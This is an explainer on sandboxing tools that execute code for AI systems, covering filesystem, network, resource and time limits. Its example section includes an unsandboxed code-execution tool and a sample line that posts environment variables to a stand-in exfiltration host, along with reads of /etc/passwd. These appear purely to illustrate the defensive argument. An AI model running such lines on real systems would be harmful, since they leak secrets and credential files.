---
title: "Sandboxing Principles"
track: "tools-function-calling"
status: live
summary: "Any tool that runs code, touches disk, or hits the network needs isolation across four dimensions, not just argument checks."
duration: "6 min read"
---

Validation answers "is this call well-formed?" It has nothing to say about what happens when a well-formed call turns out to be a bad idea — a code-execution tool that was asked to "just print the config" and reads `/etc/shadow` instead. Sandboxing is the layer that limits the damage regardless of whether the call was well-formed.

## What it is

A sandbox is a boundary around *execution*, not around arguments. Anything a tool actually does — run code, read or write files, make network requests, spawn a process — happens inside that boundary, and the boundary defines the absolute ceiling of what a bad call can reach, independent of how well you validated its inputs. Validation and sandboxing are complementary, not redundant: validation catches what you anticipated; the sandbox catches what you didn't.

Four dimensions define a sandbox's strength:

- **Filesystem** — what paths the process can read or write, if any. A fresh, ephemeral working directory beats "trust the path argument" every time; a read-only mount of exactly what's needed beats a writable one.
- **Network** — what hosts the process can reach. Default to none; allowlist specific hosts only when a tool genuinely needs them.
- **CPU / memory** — hard ceilings so one runaway or malicious call can't degrade the whole system or blow a cloud bill.
- **Time** — a wall-clock limit per call, so a hung or looping execution gets killed rather than held open indefinitely.

## The mental model

Ask, for every tool that executes anything: **if the arguments were adversarial and every check upstream failed, what's the worst this sandbox lets it do?** A well-designed sandbox makes that answer boring — "waste a few seconds of CPU in an empty container with no network" — regardless of how creative the bad call was. That's a fundamentally different guarantee than validation, which only defends against inputs someone thought to check for.

## Why it works this way

Tool execution is the one place in the whole tool-calling pipeline where model-generated text turns into real-world side effects — filesystem writes, outbound requests, spent compute. Every other stage (the schema, the prompt, the argument validation) is still just shaping *text*; text can't hurt anything until something executes it. That makes execution the highest-leverage place to put a hard boundary, because it's the last point in the pipeline, the one place where a mistake anywhere upstream — a bad validation rule, a successful [injection](/learn/tools-function-calling/tool-results-as-injection-vector), a model that's simply confused — still has to pass through before it becomes damage. A boundary enforced by the OS or a container runtime holds regardless of what convinced the model to try; a boundary enforced by a system-prompt instruction does not, because prose is not a control the model is mechanically bound by.

## A concrete example (shown)

A `run_python` tool with no sandbox:

```python
@register("run_python", RunPythonArgs, tier="write")
def run_python(ctx, args: RunPythonArgs):
    result = subprocess.run(["python3", "-c", args.code], capture_output=True, text=True)
    return result.stdout
```

This runs on the host, as the host process's user, with the host's filesystem and network fully reachable. Nothing about the *arguments* being valid Python protects you — valid Python can still do `open("/etc/passwd").read()` or `requests.post("https://evil.example/exfil", data=os.environ)`. [Sandboxing a Tool in a Container](/learn/tools-function-calling/sandboxing-with-containers) rebuilds this exact tool with network disabled, a read-only mount, and resource caps, and shows the exfiltration attempt fail.

## Where it shows up

Anywhere a tool does more than read from a database you control: [code execution tools](/learn/tools-function-calling/code-execution-as-a-tool), file-manipulation tools, [browser and computer-use tools](/learn/tools-function-calling/computer-use-and-browser-tools) that can navigate to arbitrary URLs, and any tool that shells out to a CLI. A tool that only queries a scoped, read-only database view arguably doesn't need this layer at all — the database's own access controls are the sandbox. The dividing line is whether the tool's *mechanism* (not its intent) can touch something you didn't explicitly grant it.

## Watch out for

- **Treating "we validate the code before running it" as a substitute for isolation.** Static checks on arbitrary code are famously incomplete — there's no reliable way to prove a Python snippet won't do something bad without running it, and running it is exactly the step that needs the boundary.
- **A sandbox with no network limit "for convenience."** The single most common real-world exploitation path for a code-execution tool is exfiltration over the network, not filesystem damage — see [Sandboxing a Tool in a Container](/learn/tools-function-calling/sandboxing-with-containers) for what that looks like blocked.
- **Sizing the sandbox to the tool's intended use, not its actual capability.** A tool that's "supposed to" just parse a CSV but runs with a general-purpose interpreter can still be asked to do anything a general-purpose interpreter can do. Sandbox to what the mechanism *can* do, not what you expect it to be asked for.

## Where next

[Sandboxing a Tool in a Container](/learn/tools-function-calling/sandboxing-with-containers) builds one of these end to end with Docker. [Subprocess vs. Container vs. microVM vs. WASM](/learn/tools-function-calling/sandboxing-approaches-compared) compares the mechanisms you'd pick from once you know which dimensions you need.

**Related:** [Sandboxing a Tool in a Container](/learn/tools-function-calling/sandboxing-with-containers), [Subprocess vs. Container vs. microVM vs. WASM](/learn/tools-function-calling/sandboxing-approaches-compared), [Sandboxing Tool Execution](/learn/tools-function-calling/sandboxing-tool-execution), [Code Execution as a Tool](/learn/tools-function-calling/code-execution-as-a-tool), [Executing Tool Calls Safely](/learn/tools-function-calling/executing-tool-calls-safely)
